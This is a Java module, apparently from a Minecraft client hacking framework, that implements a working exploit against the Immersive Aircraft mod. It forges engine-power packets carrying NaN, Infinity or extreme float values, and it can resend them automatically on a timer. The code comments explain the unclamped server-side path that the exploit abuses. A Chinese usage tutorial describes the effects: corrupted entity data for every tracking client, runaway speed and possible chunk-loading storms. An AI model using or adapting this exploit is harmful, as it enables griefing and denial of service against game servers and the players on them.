package com.redblue.red.modules.immersiveaircraft;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * IA-05: Engine power NaN/Infinity injection.
 *
 * EnginePowerMessage.receive() passes this.engineTarget to setEngineTarget().
 * Server-side path (offset 115) directly sets ENGINE synched data via
 * m_135381_ with NO clamp, NO NaN/Infinity filter.
 *
 * Has hasPassenger check (m_20363_), so attacker must be riding the vehicle.
 * Has fuelUtilization > 0 || value == 0 gate, but NaN passes fcmpl oddly.
 *
 * Wire format (index 0): writeFloat(engineTarget)
 */
public class IA05_EngineNaN implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("ic_air", "main");
    private static final int IDX_ENGINE_POWER = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("payload", "注入值", "NAN",
                "NAN", "POSITIVE_INFINITY", "NEGATIVE_INFINITY",
                "MAX_VALUE", "CUSTOM"),
        ConfigParam.ofFloat("custom_value", "自定义值", 100f, -3.4028235E38f, 3.4028235E38f)
                .visibleWhen("payload", "CUSTOM"),
        ConfigParam.ofBool("auto_repeat", "自动循环", false),
        ConfigParam.ofInt("interval", "循环间隔(tick)", 20, 1, 200)
    );

    private long lastTick = 0;

    @Override public String id() { return "ia05_engine_nan"; }
    @Override public String name() { return "引擎NaN注入"; }

    @Override
    public String description() {
        return "注入NaN/Infinity到引擎功率，污染物理计算或无限推力";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 骑乘任意 EngineVehicle (有引擎的飞行器)\n"
            + "2. 选择注入值类型:\n"
            + "   - NAN: 污染所有后续算术运算\n"
            + "   - POSITIVE_INFINITY: 无限推力\n"
            + "   - NEGATIVE_INFINITY: 反向无限推力\n"
            + "   - MAX_VALUE: 极端推力值\n"
            + "   - CUSTOM: 自定义浮点值\n"
            + "3. 点击「执行」或启用自动循环\n\n"
            + "[前置条件]\n"
            + "- 必须骑乘 EngineVehicle 且通过 hasPassenger 检查\n"
            + "- 载具需要有燃料 (fuelUtilization > 0) 或发送 0\n\n"
            + "[效果]\n"
            + "- NaN 传播到 SynchedEntityData，影响所有追踪客户端\n"
            + "- Infinity 导致极端速度，可能触发区块加载风暴";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("immersive_aircraft");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        float value = resolvePayload();
        sendEnginePower(value);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("auto_repeat").map(ConfigParam::getBool).orElse(false)) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        execute(mc);
    }

    private float resolvePayload() {
        String payload = getParam("payload").map(ConfigParam::getString).orElse("NAN");
        switch (payload) {
            case "NAN": return Float.NaN;
            case "POSITIVE_INFINITY": return Float.POSITIVE_INFINITY;
            case "NEGATIVE_INFINITY": return Float.NEGATIVE_INFINITY;
            case "MAX_VALUE": return Float.MAX_VALUE;
            case "CUSTOM":
                return getParam("custom_value").map(ConfigParam::getFloat).orElse(100f);
            default: return Float.NaN;
        }
    }

    private void sendEnginePower(float value) {
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_ENGINE_POWER);
            buf.writeFloat(value);
        });
    }
}
